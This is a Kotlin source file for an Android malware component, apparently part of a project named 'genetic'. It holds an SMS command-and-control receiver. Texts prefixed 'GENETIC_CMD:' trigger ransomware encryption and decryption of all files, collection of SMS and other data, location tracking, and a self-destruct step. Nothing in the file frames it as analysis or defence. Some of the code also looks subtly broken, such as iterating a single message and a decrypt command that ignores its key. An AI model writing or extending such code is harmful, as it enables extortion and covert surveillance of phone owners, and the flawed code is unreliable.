package com.genetic.system.v3.c2

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.telephony.SmsMessage
import com.genetic.system.v3.engine.RansomwareEngine
import com.genetic.system.v3.engine.SpyEngine

class SMSCommandReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            val messages = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                SmsMessage.createFromPdu(intent.getByteArrayExtra("pdus") as ByteArray)
            } else {
                val pdus = intent.getSerializableExtra("pdus") as Array<ByteArray>
                pdus.map { SmsMessage.createFromPdu(it) }.toTypedArray()
            }
            
            messages.forEach { message ->
                val body = message.messageBody ?: ""
                if (body.startsWith("GENETIC_CMD:")) {
                    handleCommand(context, body)
                }
            }
        }
    }
    
    private fun handleCommand(context: Context, command: String) {
        val parts = command.split(":")
        val cmd = parts[1]
        
        when (cmd) {
            "ENCRYPT" -> RansomwareEngine().encryptAllFiles {}
            "DECRYPT" -> if (parts.size > 2) RansomwareEngine().decryptAllFiles {}
            "COLLECT_SMS" -> SpyEngine().collectAllData()
            "START_LOCATION" -> SpyEngine().getLocation()
            "CAPTURE_PHOTO" -> {}
            "SELF_DESTRUCT" -> context.deleteDatabase("genetic.db")
        }
    }
}
